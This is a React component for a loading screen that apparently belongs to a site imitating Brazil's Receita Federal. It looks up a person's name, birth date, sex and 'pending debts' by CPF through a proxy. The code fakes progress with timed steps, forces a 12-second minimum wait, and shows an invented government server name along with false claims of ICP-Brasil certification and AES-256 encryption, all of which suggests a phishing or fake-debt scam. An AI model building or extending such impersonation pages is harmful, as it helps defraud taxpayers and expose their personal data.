import { useEffect, useState, useRef } from "react";
import { FileSearch, CheckCircle, Shield, Database, Server, Lock, Fingerprint } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import GovHeader from "./GovHeader";
import GovFooter from "./GovFooter";

interface Pendencia {
  codigoReceita: string;
  dataVencimento: string;
  juros: number;
  multa: number;
  numeroReferencia: string;
  valorPrincipal: number;
  valorTotal: number;
}

interface LoadingScreenProps {
  cpf: string;
  onComplete: (data: { nome: string; nascimento: string; sexo: string; pendencias: Pendencia[] }) => void;
}

const steps = [
  { icon: Fingerprint, title: "Autenticação", subtitle: "Validando identidade do contribuinte", detail: "Consultando base CPF/CNPJ..." },
  { icon: Database, title: "Base de Dados", subtitle: "Acessando registros da Receita Federal", detail: "Verificando situação cadastral..." },
  { icon: FileSearch, title: "Análise Fiscal", subtitle: "Verificando pendências e débitos", detail: "Cruzando dados tributários..." },
  { icon: Server, title: "SERPRO", subtitle: "Consulta ao sistema integrado", detail: "Obtendo informações complementares..." },
  { icon: CheckCircle, title: "Finalização", subtitle: "Gerando relatório consolidado", detail: "Preparando resultado..." },
];

const formatCpf = (cpf: string) =>
  `${cpf.slice(0, 3)}.${cpf.slice(3, 6)}.${cpf.slice(6, 9)}-${cpf.slice(9)}`;

const LoadingScreen = ({ cpf, onComplete }: LoadingScreenProps) => {
  const [activeStep, setActiveStep] = useState(0);
  const [progress, setProgress] = useState(0);
  const hasStarted = useRef(false);

  useEffect(() => {
    if (hasStarted.current) return;
    hasStarted.current = true;

    // Slower progress increments
    const progressInterval = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) return 100;
        const increment = Math.random() * 1.5 + 0.3;
        return Math.min(p + increment, 100);
      });
    }, 300);

    // Steps - slower transitions
    const timers = [
      setTimeout(() => setActiveStep(1), 2500),
      setTimeout(() => setActiveStep(2), 5000),
      setTimeout(() => setActiveStep(3), 7500),
      setTimeout(() => setActiveStep(4), 10000),
    ];

    const fetchData = async () => {
      const startTime = Date.now();
      const MIN_DURATION = 12000;
      try {
        const [consultaRes, pendenciasRes] = await Promise.all([
          supabase.functions.invoke("api-proxy", {
            body: { endpoint: "/consulta", cpf },
          }),
          supabase.functions.invoke("api-proxy", {
            body: { endpoint: "/pendencias", cpf },
          }),
        ]);

        const consultaData = consultaRes.data;
        const pendenciasData = pendenciasRes.data;

        const elapsed = Date.now() - startTime;
        if (elapsed < MIN_DURATION) await new Promise((r) => setTimeout(r, MIN_DURATION - elapsed));

        setProgress(100);
        await new Promise((r) => setTimeout(r, 800));

        onComplete({
          nome: consultaData?.success ? consultaData.nome : "ERRO NA CONSULTA",
          nascimento: consultaData?.success ? consultaData.dataNascimento : "--/--/----",
          sexo: consultaData?.success ? consultaData.sexo : "N/A",
          pendencias: pendenciasData?.success ? pendenciasData.pendencias : [],
        });
      } catch (error) {
        const elapsed = Date.now() - startTime;
        if (elapsed < MIN_DURATION) await new Promise((r) => setTimeout(r, MIN_DURATION - elapsed));
        setProgress(100);
        await new Promise((r) => setTimeout(r, 800));
        onComplete({
          nome: "ERRO NA CONSULTA",
          nascimento: "--/--/----",
          sexo: "N/A",
          pendencias: [],
        });
      }
    };

    setTimeout(() => fetchData(), 500);

    return () => {
      clearInterval(progressInterval);
      timers.forEach(clearTimeout);
    };
  }, [cpf, onComplete]);

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <GovHeader cpf={cpf} />

      {/* Info bar */}
      <div className="w-full bg-primary/5 border-b border-border py-2">
        <div className="mx-auto max-w-3xl px-4 flex items-center justify-between text-xs text-muted-foreground">
          <div className="flex items-center gap-2">
            <Lock className="h-3 w-3 text-accent" />
            <span>Sessão segura • Protocolo TLS 1.3</span>
          </div>
          <span>Servidor: srf-prod-03.receita.fazenda.gov.br</span>
        </div>
      </div>

      <div className="flex-1 flex items-center justify-center px-4 py-10">
        <div className="w-full max-w-3xl animate-fade-in-up">
          <div className="text-center mb-8">
            <h1 className="text-2xl font-extrabold text-foreground tracking-tight">Processando Consulta</h1>
            <p className="mt-1 text-sm text-muted-foreground">
              CPF: <span className="font-semibold text-foreground font-mono">{formatCpf(cpf)}</span>
            </p>
          </div>

          {/* Progress bar with percentage */}
          <div className="mx-auto mb-8 max-w-lg">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-medium text-muted-foreground">Progresso da consulta</span>
              <span className="text-xs font-bold text-primary font-mono">{Math.round(progress)}%</span>
            </div>
            <div className="h-2.5 overflow-hidden rounded-full bg-secondary">
              <div
                className="h-full rounded-full gradient-loading transition-all duration-300 ease-out"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>

          {/* Steps - horizontal pipeline */}
          <div className="mb-8 grid grid-cols-5 gap-2">
            {steps.map((step, i) => {
              const Icon = step.icon;
              const isActive = i <= activeStep;
              const isCurrent = i === activeStep;
              return (
                <div
                  key={i}
                  className={`rounded-xl border p-3 text-center transition-all duration-500 ${
                    isCurrent
                      ? "border-primary/40 bg-primary/5 shadow-md"
                      : isActive
                        ? "border-accent/30 bg-card"
                        : "border-transparent bg-card/30"
                  }`}
                >
                  <div className="mb-2 flex justify-center">
                    <div className={`flex h-9 w-9 items-center justify-center rounded-lg transition-all duration-500 ${
                      isCurrent
                        ? "gradient-primary shadow-sm animate-pulse"
                        : isActive
                          ? "bg-accent/10"
                          : "bg-muted"
                    }`}>
                      <Icon className={`h-4 w-4 transition-colors duration-500 ${
                        isCurrent ? "text-primary-foreground" : isActive ? "text-accent" : "text-muted-foreground/30"
                      }`} />
                    </div>
                  </div>
                  <h3 className={`text-xs font-bold transition-colors duration-500 ${
                    isActive ? "text-foreground" : "text-muted-foreground/40"
                  }`}>
                    {step.title}
                  </h3>
                  <p className="mt-0.5 text-[9px] text-muted-foreground leading-tight hidden sm:block">{step.subtitle}</p>
                </div>
              );
            })}
          </div>

          {/* Security notice */}
          <div className="rounded-2xl border border-border bg-card p-4 shadow-sm">
            <div className="flex items-start gap-3">
              <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-xl bg-accent/10">
                <Shield className="h-4 w-4 text-accent" />
              </div>
              <div>
                <h4 className="font-bold text-foreground text-sm">Ambiente Seguro</h4>
                <p className="mt-0.5 text-xs text-muted-foreground leading-relaxed">
                  Processamento em ambiente certificado ICP-Brasil. Dados transmitidos com criptografia AES-256.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
      <GovFooter />
    </div>
  );
};

export default LoadingScreen;
